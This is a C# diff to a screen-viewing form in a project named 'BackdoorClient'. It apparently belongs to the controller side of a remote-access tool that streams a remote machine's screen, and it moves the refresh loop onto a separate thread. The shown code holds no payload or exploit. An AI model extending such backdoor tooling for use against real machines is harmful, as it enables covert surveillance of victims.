@@ -6,6 +6,7 @@ using System.Drawing;
 using System.IO;
 using System.Linq;
 using System.Text;
+using System.Threading;
 using System.Threading.Tasks;
 using System.Windows.Forms;
 using System.Xml;
@@ -15,20 +16,30 @@ namespace BackdoorClient
     public partial class ScreenViewStream : Form
     {
         public Form1 mainForm;
+        public Thread UpdateScreenThread;
+
         public ScreenViewStream(Form1 f)
         {
             mainForm = f;
             InitializeComponent();
         }
+        protected override void OnFormClosed(FormClosedEventArgs e)
+        {
+   
+            //base.OnFormClosing(e);
+            UpdateScreenThread.Abort();
+        }
 
         private void ScreenViewStream_Load(object sender, EventArgs e)
         {
-            UpdateScreen();
+            UpdateScreenThread = new Thread(() => UpdateScreen());
+            //UpdateScreen();
+            UpdateScreenThread.Start();
         }
 
-        private async void UpdateScreen()
+        private void UpdateScreen()
         {
-            await Task.Run(() => System.Threading.Thread.Sleep(1000));
+            System.Threading.Thread.Sleep(1000);
             while (true)
             {
                 var pictrBytes = new byte[100000];
@@ -44,13 +55,14 @@ namespace BackdoorClient
 
 
                     translScreen.Image = bmp;
+         
                 }
                 catch
                 {
 
                 }
-                translScreen.Update();
-                await Task.Run(() => System.Threading.Thread.Sleep(100));
+                translScreen.Invoke(new Action(translScreen.Update));
+                System.Threading.Thread.Sleep(100);
             }
         }
 
